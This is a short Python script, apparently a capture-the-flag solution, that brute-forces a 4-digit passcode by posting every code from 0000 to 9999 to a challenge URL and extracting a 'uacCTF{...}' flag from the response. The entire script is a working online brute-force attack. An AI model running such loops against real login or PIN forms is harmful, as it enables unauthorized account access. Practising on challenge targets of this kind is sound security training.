import requests

# Target URL
url = "https://iphone-production.up.railway.app/"

# Fixed passcode length (4 digits)
for i in range(10000):
    # Format the number as a 4-digit string (e.g., 0000, 0001, ..., 9999)
    passcode = f"{i:04}"
    
    # Send a POST request with the passcode
    data = {"passcode": passcode}
    response = requests.post(url, data=data)
    
    # Check if the response contains the flag
    if "Correct! You've unlocked the phone." in response.text:
        print(f"Success! Passcode: {passcode}")
        print("Flag:", response.text.split("uacCTF{")[1].split("}")[0])
        break
    else:
        print(f"Tried: {passcode} - Incorrect")
